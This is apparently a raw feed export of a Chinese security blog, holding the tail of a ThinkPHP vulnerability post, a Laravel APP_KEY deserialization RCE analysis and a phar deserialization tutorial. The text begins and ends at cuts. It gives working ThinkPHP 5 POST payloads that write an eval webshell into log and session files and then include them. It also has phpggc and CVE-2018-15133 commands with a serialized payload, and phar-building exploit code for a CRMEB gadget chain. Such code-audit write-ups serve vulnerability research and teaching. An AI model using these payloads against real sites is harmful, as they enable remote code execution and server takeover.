punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'`.`'</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token string">'`.'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>然而parseKey并没有对传入的字符进行任何过滤，所以当输入exp，inc，dec，都返回的字符串，为什么参数值为exp的时候不能产生注入，原因是在用input方法传入的时候，要经过filterExp进行过滤</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filterExp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token punctuation">}</span></code></pre><p>当匹配到exp的时候，就会在exp后面添加一个空格，导致不能同parseKey方法中的exp相等。同样，利用insert方法向数据库插入数据也是同种原理。由于篇幅问题，网上的分析文章也多，之后的注入不想再造轮子了，可以详细看这个师傅的文章：<a href="https://github.com/Mochazz/ThinkPHP-Vuln。" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln。</a></p><h4 id="TP5-rce漏洞"><a href="#TP5-rce漏洞" class="headerlink" title="TP5 rce漏洞"></a><strong>TP5 rce漏洞</strong></h4><p>TP5的rce漏洞影响版本：ThinkPHP 5.0.x ~ 5.0.23、ThinkPHP 5.1.x ~ 5.1.31、ThinkPHP 5.2.0beta1</p><p>TP5rce的分析网上也比较多了，我这里有也不造轮子了，主要说下在TP渗透，php7版本的关于log文件和session文件包含的问题。</p><h5 id="runtime文件包含拿shell"><a href="#runtime文件包含拿shell" class="headerlink" title="runtime文件包含拿shell"></a><strong>runtime文件包含拿shell</strong></h5><p>先写入一句话到runtime日志中，POST发送</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code></pre><p>runtime的日志文件为./runtime/log/202008/17.log</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202008/17.log&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/19.png" alt="" loading="lazy"></p><h5 id="session文件包含拿shell"><a href="#session文件包含拿shell" class="headerlink" title="session文件包含拿shell"></a><strong>session文件包含拿shell</strong></h5><p>写入session文件</p><pre><code>_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&amp;server[]=1</code></pre><p>一般linux下的session文件存储在/var/lib/php/session，session的命名为sess_[PHPSESSID]</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/var/lib/php/session/sess_sf9vlodcl4j4r1bhli2ddnvr32&amp;server[]=1&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/20.png" alt="" loading="lazy"></p><p>其实也可以用反序列化的点来，只是有点麻烦，需要去调代码。</p><pre><code>_method=__construct&amp;filter=unserialize&amp;method=get&amp;server[REQUEST_METHOD]=序列化</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h4><p>反序列化点通常都是在代码审计当中被发现的，当unserialize可控时可以触发，但是只光靠unserialize可控很难找到可控点，这时安全研究员<strong>Sam Thomas</strong>分享了一个关于phar反序列的漏洞，大大增加了反序列化的利用点。由于TP5-6的反序列化分析篇幅比较大，可以直接看我博客：</p><p>Thinkphp5.0.24反序列：<a href="https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>Thinkphp5.1.x反序列：<a href="https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x反序列化链分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p><p>Thinkphp6.x反序列：<a href="https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>phar反序列化挖掘案列：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Runtime日志&quot;&gt;&lt;a href=&quot;#Runtime日志&quot; class=&quot;headerlink&quot; title=&quot;Runtime日志&quot;&gt;&lt;/a&gt;&lt;strong&gt;Runtime日志&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在ThinkPHP3的版本中，入口文件index.
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Laravel APP_KEY泄露 RCE漏洞分析</title>
    <link href="http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-13T16:00:00.000Z</published>
    <updated>2020-08-14T10:46:06.146Z</updated>
    
    <content type="html"><![CDATA[<p>laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：<strong>5.5.x&lt;=5.5.40、5.6.x&lt;=5.6.29</strong></p><h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a><strong>环境安装</strong></h4><pre><code>composer create-project laravel/laravel laravel5629 --prefer-dist &quot;5.6.0&quot;修改composer.json中的5.6.0为5.6.29更新：composer update在routes/web.php新添加一条路由：Route::post(&#39;/&#39;, function() {return view(&#39;welcome&#39;);});</code></pre><h4 id="通过Cookie反序列化"><a href="#通过Cookie反序列化" class="headerlink" title="通过Cookie反序列化"></a><strong>通过Cookie反序列化</strong></h4><p>跟踪代码app\Http\Middleware\EncryptCookies.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>EncryptCookies</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">EncryptCookies</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">//</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪EncryptCookies的父类，vendor\laravel\framework\src\Illuminate\Cookie\Middleware\EncryptCookies.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进decrypt方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isDisabled</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DecryptException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$request</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里$request-&gt;cookies进行了遍历，将值传入了decryptCookie方法。继续跟进decryptCookie方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptArray</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encrypter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上面判断我们传入的是否为数组，不为数组进入到decrypt，跟进vendor\laravel\framework\src\Illuminate\Encryption\Encrypter.php的decrypt方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/1.png" alt="" loading="lazy"></p><p>跟进getJsonPayload方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getJsonPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The payload is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validMac</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The MAC is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们传入的payload会解密base64，再转化为json，所以这个iv和value是我们可控的，最终就可以来到第149行进行反序列化操作了。</p><h4 id="通过X-XSRF-TOKEN头反序列化"><a href="#通过X-XSRF-TOKEN头反序列化" class="headerlink" title="通过X-XSRF-TOKEN头反序列化"></a><strong>通过X-XSRF-TOKEN头反序列化</strong></h4><p>跟踪代码app\Http\Middleware\VerifyCsrfToken.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>VerifyCsrfToken</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">VerifyCsrfToken</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪VerifyCsrfToken的父类，vendor\laravel\framework\src\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isReading</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">runningUnitTests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">inExceptArray</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addCookieToResponse</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TokenMismatchException</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>继续更进tokensMatch方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进getTokenFromRequest方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/2.png" alt="" loading="lazy"></p><p>第140行获取头X-XSRF-TOKEN，又来到熟悉的地方了，更新decrypt方法，跟cookie造成的洞是同一个点。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p>获取APP_KEY，在根目录.env文件里</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/3.png" alt="" loading="lazy"></p><p>用<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a>获取laravel的反序列化的exp</p><pre><code>php phpggc Laravel/RCE1 system &quot;ipconfig&quot; -b</code></pre><p>利用kozmic的poc生成laravel rce的利用代码</p><pre><code>php cve-2018-15133.php yyEsCy8SJCpScYkcEBvrRVHv9MDV43MliNS/4ETRJaw= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6ImlwY29uZmlnIjt9</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/4.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/5.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://xz.aliyun.com/t/6533" target="_blank" rel="noopener">https://xz.aliyun.com/t/6533</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：&lt;strong&gt;5.5.x&amp;lt;=5.5.40、5.6.x&amp;lt;=5.6.29&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞挖掘</title>
    <link href="http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2020-07-21T16:00:00.000Z</published>
    <updated>2020-08-17T09:38:05.541Z</updated>
    
    <content type="html"><![CDATA[<h4 id="phar的结构"><a href="#phar的结构" class="headerlink" title="phar的结构"></a><strong>phar的结构</strong></h4><ol><li>a stub是一个文件标志，格式为 ：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。</li><li>manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</li><li>contents是被压缩的内容。</li><li><code>signature</code> 签名，放在文件末尾。</li></ol><h4 id="受影响函数"><a href="#受影响函数" class="headerlink" title="受影响函数"></a><strong>受影响函数</strong></h4><table><thead><tr><th align="center">fileatime</th><th align="center">filectime</th><th align="center">file_exists</th><th align="center">file_get_contents</th></tr></thead><tbody><tr><td align="center">file_put_contents</td><td align="center">file</td><td align="center">filegroup</td><td align="center">fopen</td></tr><tr><td align="center">fileinode</td><td align="center">filemtime</td><td align="center">fileowner</td><td align="center">fileperms</td></tr><tr><td align="center">is_dir</td><td align="center">is_executable</td><td align="center">is_file</td><td align="center">is_link</td></tr><tr><td align="center">is_readable</td><td align="center">is_writeable</td><td align="center">parse_ini_file</td><td align="center">copy</td></tr><tr><td align="center">unlink</td><td align="center">stat</td><td align="center">is_writable</td><td align="center">readfile</td></tr></tbody></table><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar文件是通过stub来标识的，是通过<code>xxx&lt;?php xxx.__HALT_COMPILER(); ?&gt;</code>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/1.png" alt="" loading="lazy"></p><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p><pre><code>phar.readonly = off</code></pre><h4 id="CRMEB系统phar反序列化"><a href="#CRMEB系统phar反序列化" class="headerlink" title="CRMEB系统phar反序列化"></a><strong>CRMEB系统phar反序列化</strong></h4><p>CRMEB是基于THINKPHP6.0开发的，tp6.0的反序列化链在前面的文章分析过，利用pop链生成php文件。由于是后台反序列化也只能供学习。在crmeb\app\admin\controller\system\SystemFile.php下的openfile方法中的file参数可控。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/2.png" alt="" loading="lazy"></p><p>第66行将file赋值给了filepath变量，然后跟进67的read_file方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/3.png" alt="" loading="lazy"></p><p>这里$file可控，且存在执行phar反序列化的危险函数，同时这里也可以任意文件读取</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/4.png" alt="" loading="lazy"></p><p>生成phar文件，执行tp6.0反序列化漏洞，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token 